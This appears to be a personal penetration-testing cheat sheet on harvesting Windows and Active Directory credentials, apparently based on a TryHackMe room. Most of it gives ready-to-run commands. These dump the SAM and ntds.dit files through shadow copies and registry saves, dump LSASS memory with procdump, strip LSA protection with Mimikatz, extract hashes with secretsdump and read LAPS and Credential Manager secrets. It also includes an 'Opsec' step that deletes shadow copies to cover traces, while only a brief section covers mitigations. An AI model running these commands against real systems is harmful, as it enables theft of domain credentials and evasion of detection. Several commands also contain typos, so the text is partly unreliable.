
Credentials Harvesting is a term for any technique used to gain access to user and system credentials.

## Credential Access

Credentials are stored insecurely in various locations in systems:

-   Clear-text files - **Unsecured Credentials: Credentials In Files** ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).
	-   Commands history	
	-   Configuration files (Web App, FTP files, etc.)
	-   Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
	-   Backup files
	-   Shared files and folders
	-   Registry
		- `reg query HKLM /f password /t REG_SZ /s`
		- `reg query HKCU /f password /t REG_SZ /s`
	-   Source code
-   Database files
	- Third party databases
-   Memory - accessing memory is limited to administrator users who fully control the system
	-   Clear-text credentials
	-   Cached passwords
	-   AD Tickets
-   Password managers - misconfigurations and security flaws exist.
	- Built-in password managers (Windows)
	- Third-party: KeePass, 1Password, LastPass
-   Enterprise Vaults
-   Active Directory
	- Users descriptions: Admin sometimes leave password in the description for new employees
	- Group Policy SYSVOL: Leaked encryption keys, `Cpassword`
	- NTDS: `ndts.dit` file, on the domain controller
	- AD Attacks
-   Network Sniffing
	- Man-In-the-Middle attack against network protocols to steal NTLM hashes for later [[Pass-The-Hash]]

## Local Windows Credentials

- [[Keylogging]]
- `c:\Windows\System32\config\sam`, just copy and crack - encrypt [RC4](https://en.wikipedia.org/wiki/RC4) or [AES]https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
- [[Metasploit]]'s [Meterpreter]([[Meterpreter-Commands]]) shell has the `hashdump` command
- Volume Shadow Copy Service - its [documentation](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
Microsoft Volume shadow copy service performs a volume backup while applications read/write on volumes. With administrator privileges use wmic to create a shadow volume copy.
```powershell
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows # verify the replication of the shadow volume
# copy should be \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
# copy the SAM database
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
# copy the decryption key
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
- Registry Hives
```powershell
# Dump the SAM database
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```
Use `secretsdump` from [[Impacket-Cheatsheet]]
```bash
impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

The wonder that is [[Mimikatz-Cheatsheet]]


## Local Security Authority Subsystem Service (LSASS)

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory! Both non-protected and protected LSASS dumping discuss.

`reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 0

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. Windows system stores credentials in the LSASS process to enable users to access network resources and services. With Administrative privileges we can dump the LSASS process memory. MITRE ATT&CK framework defines as [OS Credential Dumping LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/). Detail below are various methods:

#### Unprotected LSASS Dump

- GUI :`Open 'Task Manager' -> Detail tabs -> Right-Click on lssas.exe -> Create Dump File`
- [Sysinternals Suite]([[Sysinternals-Hub]])'s [procdump]([[Sysinternals-Procdump]]) with `procdump.exe -accepteula -ma lsass.exe C:\administrator\desktop\lsass_dump`

#### Extracting Credentials from LSASS Dump & LSA Protection Disabling 

[[Mimikatz-Cheatsheet]]

```powershell
privilege::debug
sekurlsa::logonpasswords
# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
# Means LSA protection:
!+ # mimidrv.sys driver disables LSA protection.
!processprotect /process:lsass.exe /remove
```

## Windows Credential Manager

**Requires GUI and password to reveal passwords stored**: `Control Panel -> User Accounts Credential Manager -> $Category-Type` . Unless powershell or csharp tool exists:
[[Nishang-Helpsheet]] - [Nishang Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)

Credential Manager is Windows Features that stores credentials. These Authentication details are stored on the user's folder and are not shared among Windows user accounts and are cache in memory. Caterogies of Credentials stored by Windows Credential Manager:

Credential Categories | Contains
--- | ---
Web credentials  | Authentication details stored in Internet browsers or other applications.
Windows credentials |  Windows authentication details, such as NTLM or Kerberos.
Generic credentials |  Basic authentication details, such as clear-text usernames and passwords.
Certificate-based credentials |  Authenticated details based on certifications.

```powershell
vaultcmd /list
# Web credentials, Windows credentials, Generic credentials. Certificate-based credentials
vaultcmd /listproperties:"$category" 
# Will display the number, location in AppData and protection method
vaultcmd /listcreds:"$category" # information about stored credentials
```

With Nishang
```powershell
Import-Module C:\Tools\Get-WebCredentials.ps1
WebCredentials
```

With [[Mimikatz-Cheatsheet]]

```powershell
privilege::debug
# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
# Means LSA protection:
!+ # mimidrv.sys driver disables LSA protection.
!processprotect /process:lsass.exe /remove
sekurlsa::credman
```

#### RunAs

RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions with the `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager
```powershell
cmdkey /savecred # save credentials!
cmdkey /list
cmdkey /list:computer # more detailed
runas /savecred /user:$user\$target-host cmd.exe
```


## Domain Controller

New Technologies Directory Services (NTDS) is a encrypted database containing all Active Directory data, including objects, attributes, credentials, user objects, groups and group membership. NTDS is located in `C:\Windows\NTDS` by default. It is constantly in use by AD and therefore locked and cannot be simply copied.

Active Directory has three types of data

-   **Schema information**   
    definitional details about objects and attributes that one CAN store in the AD. Replicates to all domain controllers. Static in nature.
-   **Configuration information**   
    configuration data about forest and trees. Replicates to all domain controllers. Static as your forest is.
-   **Domain information**   
    object information for a domain. Replicates to all domain controllers within a domain. The object portion becomes part of Global Catalog. The attribute values (the actual bulk of data) only replicates within the  
    domain.

The NTDS.DTS data consists of:
Table | Contents 
--- | --- | ---
Schema table | Types of objects that can be created in the Active Directory, relationships between them, and the optional and mandatory attributes on each type of object. 
Link table | Object's attributes and their values; linked attributes, which contain values referring to other objects in the Active Directory
Data type | Users, groups,application-specific data, and any other data stored in the Active Directory. The data table can be thought of as having rows where each row represents an instance of an object such as a user, and columns where each column represents an attribute in the schema such as GivenName.

To dump the NTDS.dit we require:

-   `C:\Windows\NTDS\ntds.dit`
-   `C:\Windows\System32\config\SYSTEM
-   `C:\Windows\System32\config\SECURITY`

- Use Volume Shadow Copies via the VSSAdmin command
	1. Create a volume shadow copy:
		- `vssadmin creatre shadow /for=c:`
	2.  Retrieve the Ntds.dit file from volume shadow copy:
			- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit`
	3. Copy the SYSTEM file from the registry or volume shadow copy, since it contains the Boot Key that will be needed to decrypt the Ntds.dit file later:	 
			- `reg save HKLM\SYSTEM c:\Extract\SYS`
			- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM c:\Extract\SYSTEM`
	4. Opsec - remove shadow 
		- `vssadmin delete shadows /shadow={$shadow}`


- Use the PowerSploit penetration testing PowerShell modules - copy and extract
	1.  `Invoke-NinjaCopy -path c:\Windows\NTDS\ntds.dit -verbose -localdestination C:\extract\ntds.dit`
	2. `GET-ADDBAccount -ALL -DBPath 'C:\extract\ntds.dit' -Bottkey $key`

- Leverage the [NTDSUtil](https://technet.microsoft.com/en-us/library/cc753343(v=ws.11).aspx) diagnostic tool available as part of Active Directory - [Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)) it can:
	-   Restore deleted objects in Active Directory.
	-   Perform maintenance for the AD database.
	-   Active Directory snapshot management.
	-   Set Directory Services Restore Mode (DSRM) administrator passwords.

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
Then [[Impacket-Cheatsheet]] - `secretsdump`
```bash
impacket-secretsdump -security $pathToSECURITY -system $pathToSYSTEM -ntds $pathToNtds.dit local
```

- Leverage snapshots if the domain controllers are running as virtual machines

#### Remote Dumping (With Credentials)
The technique of dumping a system and domain controller hashes remotely; requires credentials - passwords or NTLM hashes. [[DC-Sync-Attack]] - requires accounts with these permissions:
-   Replicating Directory Changes
-   Replicating Directory Changes All
-   Replicating Directory Changes in Filtered Set

#### DC Compromise Mitigations 

- Limit the number of users who can log on to domain controllers
	- Trim the Domain/Enterprise Admins group 
	- Check Print Operators, Server Operators and Account Operators privileges
- Reduce attack surface
- Detection and Block access to NTDS.dit

## Local Administrator Password Solution (LAPS)

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder and introduced LAPS. Some Group Policy Preferences GPP Background: 

Changing passwords in a large Windows environment is difficult, Microsoft implemented using GPP changing of Administrators - unfortunately [Microsoft published the AES-256 key](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)  therefore easy to decrypt the stored passwords. Use [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) or [[Impacket-Cheatsheet]].

Local Administrator Password Solution (LAPS) on the other had is more secure approach to remote managing of local administrator passwords:

- `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator
- `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password
- LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`

Enumerate for Laps - Use [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) beware real-world AD environment the LAPS is enabled only on specific machines.
```powershell
# Check if LAPs is local
dir "C:\Program Files\LAPS\CSE"
# Confirm LAPS is operational 
Get-Command *AdmPwd* 
# Find an AD organizational unit (OU) has the "All extended rights"
Find-AdmPwdExtendedRights -Identity $OUTarget # Excepts wildcard use: * for all   
# Enumerate the group from the $OUTarget, then target individual user
net groups "$groupfound"
net user $user
# Compromise User
get-admpwdpassword -computername
```



- [[Attacking-Kerberos]] - by Kerberoasting with [[Impacket-Cheatsheet]] `GetUsersSPNs` - requesting a TGT and TGS of SPNs accounts for [[Golden-Tickets]] or [[Silver-Tickets]].
- AS-REP Roasting - [[Impacket-Cheatsheet]] `GetBPUsers` - retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication"
- SMB Relay Attacks - abuse  the NTLM authentication mechanism[[AD-Automated-Relays-Exploitation]]
- LLMNR/NBNS Poisoning - [[Responder-Cheatsheet]] - is to capture authentication NTLM hashes for a victim



## References

[Tryhackme Credential Harvesting](https://tryhackme.com/room/credharvesting)
[netwrix.com Extracting Password Hashes from the Ntds.dit File](https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/)
[NTDSUtil Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11))
[What is the NTDS.dit windowstechno](https://www.windowstechno.com/what-is-ntds-dit/)
